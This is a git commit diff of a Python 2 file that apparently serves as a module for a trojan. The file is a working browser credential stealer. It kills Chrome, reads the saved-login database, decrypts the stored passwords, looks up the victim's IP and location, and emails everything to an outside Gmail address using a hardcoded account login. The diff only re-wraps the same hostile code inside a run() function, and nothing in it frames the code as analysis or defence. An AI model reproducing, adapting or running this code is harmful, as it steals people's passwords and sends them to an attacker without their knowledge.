2e49e21f12da24e8b350ab63e4c772e347e695dd
keptom <33152167+keptom@users.noreply.github.com>
2017-11-07 03:58:38 -0800

    Update c.py

--- c.py
+++ c.py
@@ -15,134 +15,136 @@ import re
 import json
 from urllib2 import urlopen
 
-os.system("taskkill /F /IM chrome.exe")
-gmail_user ='peterkowell@gmail.com'
-gmail_pwd ='holymoses'
-subject='chrome tins'
-url = 'http://ipinfo.io/json'
-response = urlopen(url)
-data = json.load(response)
 
-IP=data['ip']
-org=data['org']
-city = data['city']
-country=data['country']
-region=data['region']
-text='Your IP detail\n IP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP)
-attach='l.txt'
-to ="chsrp135@gmail.com"
-def mail():
-    import sys
-    with open(attach, 'a+') as f:
-        sys.stdout = f
-        print main()
-        msg = MIMEMultipart()
-        msg['From'] = gmail_user
-        msg['To'] = to
-        msg['Subject'] = subject
 
-        msg.attach(MIMEText(text))
-
-        part = MIMEBase('application', 'octet-stream')
-        part.set_payload(open(attach, 'rb').read())
-        Encoders.encode_base64(part)
-        part.add_header('Content-Disposition','attachment; filename="%s"' % os.path.basename(attach))
-        msg.attach(part)
-
-        mailServer = smtplib.SMTP("smtp.gmail.com", 587)
-        mailServer.ehlo()
-        mailServer.starttls()
-        mailServer.ehlo()
-        mailServer.login(gmail_user, gmail_pwd)
-        mailServer.sendmail(gmail_user,to, msg.as_string())
-        mailServer.close()
-        return str(main())
+def run(**args):
     
+    os.system("taskkill /F /IM chrome.exe")
+    gmail_user ='peterkowell@gmail.com'
+    gmail_pwd ='holymoses'
+    subject='chrome tins'
+    url = 'http://ipinfo.io/json'
+    response = urlopen(url)
+    data = json.load(response)
 
-def main():
-    info_list = []
-    path = getpath()
-    try:
-        connection = sqlite3.connect(path + "Login Data")
-        with connection:
-            cursor = connection.cursor()
-            v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
-            value = v.fetchall()
-            
-        if (os.name == "posix") and (sys.platform == "darwin"):
-                print("Mac OSX not supported.")
-                sys.exit(0)
+    IP=data['ip']
+    org=data['org']
+    city = data['city']
+    country=data['country']
+    region=data['region']
+    text='Your IP detail\n IP : {4} \nRegion : {1} \nCountry : {2} \nCity : {3} \nOrg : {0}'.format(org,region,country,city,IP)
+    attach='l.txt'
+    to ="chsrp135@gmail.com"
+    def mail():
+        import sys
+        with open(attach, 'a+') as f:
+            sys.stdout = f
+            print main()
+            msg = MIMEMultipart()
+            msg['From'] = gmail_user
+            msg['To'] = to
+            msg['Subject'] = subject
 
-        for information in value:
+            msg.attach(MIMEText(text))
 
-            
-            if os.name == 'nt':
-                password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
-                if password:
+            part = MIMEBase('application', 'octet-stream')
+            part.set_payload(open(attach, 'rb').read())
+            Encoders.encode_base64(part)
+            part.add_header('Content-Disposition','attachment; filename="%s"' % os.path.basename(attach))
+            msg.attach(part)
+
+            mailServer = smtplib.SMTP("smtp.gmail.com", 587)
+            mailServer.ehlo()
+            mailServer.starttls()
+            mailServer.ehlo()
+            mailServer.login(gmail_user, gmail_pwd)
+            mailServer.sendmail(gmail_user,to, msg.as_string())
+            mailServer.close()
+            return str(main())
+
+
+    def main():
+        info_list = []
+        path = getpath()
+        try:
+            connection = sqlite3.connect(path + "Login Data")
+            with connection:
+                cursor = connection.cursor()
+                v = cursor.execute('SELECT action_url, username_value, password_value FROM logins')
+                value = v.fetchall()
+
+            if (os.name == "posix") and (sys.platform == "darwin"):
+                    print("Mac OSX not supported.")
+                    sys.exit(0)
+
+            for information in value:
+
+
+                if os.name == 'nt':
+                    password = win32crypt.CryptUnprotectData(information[2], None, None, None, 0)[1]
+                    if password:
+                        info_list.append({
+                            'origin_url': information[0],
+                            'username': information[1],
+                            'password': str(password)
+                        })
+
+
+
+                elif os.name == 'posix':
                     info_list.append({
                         'origin_url': information[0],
                         'username': information[1],
-                        'password': str(password)
-                    })
+                        'password': information[2]
+                        })
 
-            
 
-            elif os.name == 'posix':
-                info_list.append({
-                    'origin_url': information[0],
-                    'username': information[1],
-                    'password': information[2]
-                    })
-        
-        
-        
-        
-    except sqlite3.OperationalError, e:
-            e = str(e)
-            if (e == 'database is locked'):
-                print '[!] Make sure Google Chrome is not running in the background'
-                sys.exit(0)
-            elif (e == 'no such table: logins'):
-                print '[!] Something wrong with the database name'
-                sys.exit(0)
-            elif (e == 'unable to open database file'):
-                print '[!] Something wrong with the database path'
-                sys.exit(0)
-            else:
-                print e
-                sys.exit(0)
-    
- 
 
-    return info_list
 
-def getpath():
-    if os.name == "nt":
-            # This is the Windows Path
-            PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
-            if (os.path.isdir(PathName) == False):
-                print '[!] Chrome Doesn\'t exists'
-                sys.exit(0)
-    elif ((os.name == "posix") and (sys.platform == "darwin")):
-            # This is the OS X Path
-            PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
-            if (os.path.isdir(PathName) == False):
-                print '[!] Chrome Doesn\'t exists'
-                sys.exit(0)
-    elif (os.name == "posix"):
-            # This is the Linux Path
-            PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
-            if (os.path.isdir(PathName) == False):
-                print '[!] Chrome Doesn\'t exists'
-                sys.exit(0)
-    
-    return PathName        
+        except sqlite3.OperationalError, e:
+                e = str(e)
+                if (e == 'database is locked'):
+                    print '[!] Make sure Google Chrome is not running in the background'
+                    sys.exit(0)
+                elif (e == 'no such table: logins'):
+                    print '[!] Something wrong with the database name'
+                    sys.exit(0)
+                elif (e == 'unable to open database file'):
+                    print '[!] Something wrong with the database path'
+                    sys.exit(0)
+                else:
+                    print e
+                    sys.exit(0)
 
-def run(**args):
-       
+
+
+        return info_list
+
+    def getpath():
+        if os.name == "nt":
+                # This is the Windows Path
+                PathName = os.getenv('localappdata') + '\\Google\\Chrome\\User Data\\Default\\'
+                if (os.path.isdir(PathName) == False):
+                    print '[!] Chrome Doesn\'t exists'
+                    sys.exit(0)
+        elif ((os.name == "posix") and (sys.platform == "darwin")):
+                # This is the OS X Path
+                PathName = os.getenv('HOME') + "/Library/Application Support/Google/Chrome/Default/"
+                if (os.path.isdir(PathName) == False):
+                    print '[!] Chrome Doesn\'t exists'
+                    sys.exit(0)
+        elif (os.name == "posix"):
+                # This is the Linux Path
+                PathName = os.getenv('HOME') + '/.config/google-chrome/Default/'
+                if (os.path.isdir(PathName) == False):
+                    print '[!] Chrome Doesn\'t exists'
+                    sys.exit(0)
+
+        return PathName        
     mail()
     files = main()
     return str(files)
+
 
 
 
